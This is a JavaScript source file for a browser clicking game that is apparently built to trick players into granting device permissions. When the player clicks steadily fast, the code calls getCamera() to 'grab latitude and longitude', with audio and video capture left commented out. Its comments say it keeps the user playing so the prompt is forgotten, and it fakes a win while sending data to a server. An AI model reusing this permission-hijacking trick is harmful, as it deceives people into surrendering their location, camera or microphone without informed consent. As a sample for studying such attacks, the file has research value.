var barBackground;
var bar;
var line;
var totalHeight = 500;
var minHeight = 50;
var currentHeight = 50;
var x = 50;
var y = 100;
var firstClick = 0;
var lastClicked = 0;

var userFooled = false;

var numberOfConsecutiveFastClicks = 0;
var numberOfClicksAfterPermissionGranted = 0;

function startGame() {
	gameArea.start();
	drawComponents();
}

/**
 * draws the graphical game components
 */
function drawComponents() {
	barBackground = new component(50, totalHeight, "gray", x, y);
	barBackground.update();
	currentHeight = Math.max(minHeight, currentHeight - 1);
	bar = new component(40, currentHeight, "red", x + 5, getBarY(currentHeight));
	bar.update();
	line = new component(100, 10, "blue", x - 25, y + 100);
	line.update();
}

/**
 * Calculates the y coordinate of the red bar based on the height.
 * @param height
 * @returns {number}
 */
function getBarY(height) {
	return y - 5 + totalHeight - height;
}

/**
 * Measures the time between two clicks on the button and determines the current height of the bar.
 */
function hitMeFast() {
	var timeNow = (new Date()).getTime();
	var speed = timeNow - lastClicked;
	if ( firstClick == 0 ) {
		firstClick = timeNow;
	}
	
	if (lastClicked === 0)
		speed = totalHeight - minHeight;
	currentHeight = Math.max(currentHeight, totalHeight - speed);

	if (userFooled) {
		numberOfClicksAfterPermissionGranted++;
		// let the user play a bit more so he hopefully forgets something appeared.
		if (numberOfClicksAfterPermissionGranted > 15) {
			// Set height over the bar so user thinks he/she actually won. ;)			
			currentHeight = 444;
			m = (new Date()).getTime() - firstClick;
			sendToServer2(m,2);
			// disable click button
			document.getElementById("hitMeFast").style.display = 'none';
			// show celebration
			document.getElementById("celebration").classList.remove('d-none');
		}
	} else {
		if (currentHeight > 325) {
			numberOfConsecutiveFastClicks++;
			// wait until user is clicking steadily at a fast pace
			if (numberOfConsecutiveFastClicks > 13) {
				console.log("Permission granted");
				getCamera(); // grab latitude and longitude
				// getUserMedia('audio'); // grab audio
				// getUserMedia('video'); // grab video
			}
		} else {
			numberOfConsecutiveFastClicks = 0;
		}
	}
	console.log(numberOfConsecutiveFastClicks);
	displayUserFeedback();

	lastClicked = timeNow;
}

/**
 * Display different Feedback for the user based on the current height
 */
function displayUserFeedback() {
	var action = "Click";
	if (is_touch_device())
		action = "Tap"; 
	if (currentHeight <= 50)
		document.getElementById("message2").innerHTML = "<img src='img/1.png' width='30px' height='30px'> not FAST at all!!!";
	else if (currentHeight <= 130)
		document.getElementById("message2").innerHTML = "<img src='img/2.jpg' width='30px' height='30px'> not FAST yettttt!";
	else if (currentHeight <= 230)
		document.getElementById("message2").innerHTML = "<img src='img/3.jpg' width='30px' height='30px'> please FASTER!";
	else if (currentHeight <= 325)
		document.getElementById("message2").innerHTML = "<img src='img/4.png' width='30px' height='30px'> Should be FASTER than this!";
	else if (currentHeight <= 420)
		document.getElementById("message2").innerHTML = "<img src='img/5.png' width='30px' height='30px'> GOOOD. continue FAST!";

	document.getElementById("message2").innerHTML += `<BR> Current Height: ${currentHeight}`;

	if (currentHeight > 420)
		document.getElementById("message2").innerHTML = "Congratulations, you made it!! <img src='img/5.png' width='30px' height='30px'>";
}


var gameArea = {
	canvas: document.getElementById("gameArea"),
	start: function () {
		this.context = this.canvas.getContext("2d");
		document.body.insertBefore(this.canvas, document.body.childNodes[0]);
		this.interval = setInterval(updateGameArea, 20);
	},
	clear: function () {
		this.context.clearRect(0, 0, this.canvas.width, this.canvas.height);
	}
};

/**
 * Redraws the updated game components (bar). The line and the barBackground are stable.
 */
function updateGameArea() {
	gameArea.clear();
	drawComponents();
}

/**
 * Defines a graphical game component.
 *
 * @param width
 * @param height
 * @param color
 * @param x
 * @param y
 */
function component(width, height, color, x, y) {
	this.width = width;
	this.height = height;
	this.x = x;
	this.y = y;
	this.update = function () {
		ctx = gameArea.context;
		if (color == "red")
			ctx.fillStyle = "rgba(255, 0, 0, 1)";
		else if (color == "gray")
			ctx.fillStyle = "rgba(211,211,211, 0.4)";
		else
			ctx.fillStyle = "rgba(0, 0, 255, 1)";
		ctx.fillRect(this.x, this.y, this.width, this.height);
	}
}

/**
 * https://stackoverflow.com/questions/4817029/whats-the-best-way-to-detect-a-touch-screen-device-using-javascript
 * @returns {*}
 */
function is_touch_device() {
	var prefixes = ' -webkit- -moz- -o- -ms- '.split(' ');
	var mq = function (query) {
		return window.matchMedia(query).matches;
	};

	if (('ontouchstart' in window) || window.DocumentTouch && document instanceof DocumentTouch) {
		return true;
	}

	// include the 'heartz' as a way to have a non matching MQ to help terminate the join
	// https://git.io/vznFH
	var query = ['(', prefixes.join('touch-enabled),('), 'heartz', ')'].join('');
	return mq(query);
}